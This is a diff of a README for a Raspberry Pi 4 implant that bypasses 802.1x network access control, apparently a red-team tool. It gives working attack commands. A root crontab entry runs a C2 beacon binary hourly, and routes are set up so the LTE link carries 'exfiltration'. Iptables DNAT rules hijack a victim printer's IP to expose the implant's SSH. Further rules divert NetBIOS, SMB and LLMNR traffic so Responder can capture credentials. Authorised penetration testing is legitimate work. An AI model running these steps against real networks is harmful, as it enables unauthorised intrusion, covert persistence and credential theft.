@@ -14,7 +14,7 @@ Bash Script to Initialize a Raspberry Pi 4 for Bridged-based 802.1x (NAC) Bypass
 * **🔒 SSH Security Hardening:** Overwrites the default `sshd_config` with a more secure setup. This includes disabling password authentication by default (except for your hotspot's subnet) and enforcing stronger ciphers and MACs.
 * **⚙️ Static IP for `wlan0`:** Configures a static IP address for the `wlan0` interface (192.168.200.1) using `systemd-networkd` for reliable hotspot operation.
 * **👻 NAC Bypass Tool Installation:** Installs and sets up the `nac_bypass` tool for advanced network access control evasion. This involves loading necessary kernel modules, enabling IP forwarding, and cloning the repository.
-* **🛡️ Huawei LTE Dongle Setup:** Installs management scripts and systemd services to manage LTE/VPN Out-of-Band (OOB) connections to bypass NAT and allow remote access. Makes use of [Huawei Hilink scripts](https://github.com/zbchristian/huawei_hilink_api) for SIM PIN and LTE connection management. Uses WireGuard for VPN.
+* **🛡️ Huawei LTE Dongle Setup:** Installs management scripts and systemd services to manage LTE/VPN Out-of-Band (OOB) connections to bypass NAT and allow remote access. Makes use of [Huawei Hilink scripts](https://github.com/zbchristian/huawei_hilink_api) for SIM PIN and LTE connection management.
 
 ---
 
@@ -88,28 +88,7 @@ A DHCP server will be running, handing out client IP addresses from the range `1
 
 Once connected to the wifi hotspot, you can access the RPi4's SSH network service on TCP/22.
 
-The RPi4 will have the IP address `192.168.200.1`. Just connect with your favorite SSH client (e.g. MobaXTerm).
-
-#### Via Victim Network
-
-The NAC bypass script will add specific iptables rules to make OpenSSH and Responder work:
-
-````
-# rewrite OpenSSH and map TCP/22 (RPi) to victim NAC device (TCP/50222)
-/sbin/iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 50222 -j DNAT --to-destination 169.254.66.66:22
-
-# list rules
-sudo iptables -t nat -L -n --line-numbers
-
-# remove rules
-sudo iptables -t nat -D PREROUTING <ID>
-````
-
-You can then simply access OpenSSH using the victim network:
-
-````
-ssh <user>@<victim-printer-ip> -p 50222 -i <priv-key>
-````
+The RPi4 will have the IP address `192.168.200.1`. Just connect with your favorite SSH client (e.g. MobaXTerm on Windows or Terminus on Mobile).
 
 #### Via LTE + VPN
 
@@ -121,7 +100,7 @@ Put something like this into your root's crontab:
 
 ```
 # execute c2 beacon elf file hourly
-@hourly nohup /home/username/linux.bin 2>&1 &
+@hourly nohup /tmp/c2_beacon_arm_linux.bin 2>&1 &
 ```
 
 Also, if LTE dongle is active as eth2, we should fix ip routes:
@@ -139,11 +118,27 @@ ip route del default via 169.254.66.1 dev br0
 # should already be there, ensure the following line is available when running `ip route`
 # default via 192.168.8.1 dev eth2 proto dhcp src 192.168.8.111 metric 1018
 ````
+This makes Internet work natively and things such as `wg-quick`, `apt update`, exfiltration and so on.
 
 >[!WARNING]
 > SSH uses public key authentication for external networks per default. No password auth.
 >
 > You can adjust the `/etc/ssh/sshd_config` though and whitelist your VPN IP CIDR range for password authentication. See the last entries in the SSH config regarding `Match Address ...`.
+
+#### Via Victim Network
+
+The NAC bypass script will add specific iptables rules to make OpenSSH work. This is done automatically if you run `nac_bypass.sh` with the `-S` flag. Under the hood, the script will create iptables rules to rewrite packets originating at the victim's IP address (e.g. printer) and port `TCP/50222` to the Raspberry Pi and its OpenSSH service on `TCP/22`. This is beneficial, as you can now access the RPi's SSH service from within the corporate's network.
+
+````
+# rewrite OpenSSH and map TCP/22 (RPi) to victim NAC device (TCP/50222)
+/sbin/iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 50222 -j DNAT --to-destination 169.254.66.66:22
+````
+
+You can then simply access OpenSSH using the target corporate network and victim's IP address:
+
+````
+ssh <user>@<victim-printer-ip> -p 50222 -i <priv-key>
+````
 
 ### 7. Adjustments
 
@@ -163,7 +158,7 @@ Use the tools `/root/nac_bypass` to your advantage.
 
 May read [this](https://luemmelsec.github.io/I-got-99-problems-but-my-NAC-aint-one/) blog post by LuemmelSec and [this wiki](https://github.com/s0lst1c3/silentbridge/wiki) by Gabriel Ryan to sharpen your NAC bypass understanding.
 
-#### 6.1 - nac_bypass
+#### 8.1 - nac_bypass
 
 [README](https://github.com/scipag/nac_bypass)
 
@@ -178,4 +173,43 @@ Then start the nac bypass:
 
 # script will ask to wait some time, so it is able to dump the needed info from the network traffic
 # afterwards, you can proceed and for instance do an nmap scan on the network
+````
+
+#### 8.2 - Responder
+
+To use responder, you will need to run `nac_bypass_setup.sh` with the `-R` flag. Alike to `-S` and OpenSSH, it will automatically add iptables rules to rewrite packets.
+
+Alternatively, you can add those manually by defining the victim's IP:
+
+````
+# NetBIOS Name Service (UDP 137)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 137 -j DNAT --to-destination 169.254.66.66:137
+# NetBIOS Datagram Service (UDP 138)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 138 -j DNAT --to-destination 169.254.66.66:138
+# NetBIOS Session Service (TCP 139)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 139 -j DNAT --to-destination 169.254.66.66:139
+# SMB (TCP 445)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 445 -j DNAT --to-destination 169.254.66.66:445
+# LLMNR / Multicast (UDP 5553)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 5553 -j DNAT --to-destination 169.254.66.66:5553
+````
+
+>[!CAUTION]
+> This will actively mangle with the printer's network packages and features.
+> You basically rewrite important packets to your RPi and the printer won't see them anymore.
+
+In case you want to remove those iptables rules:
+
+````
+# list rules with ids
+sudo iptables -t nat -L -n --line-numbers
+
+# remove rules by id
+sudo iptables -t nat -D PREROUTING <ID>
+````
+
+Then you must execute responder like so:
+
+````
+sudo /usr/sbin/responder -I br0 -e <VICTIM-PRINTER-IP>
 ````
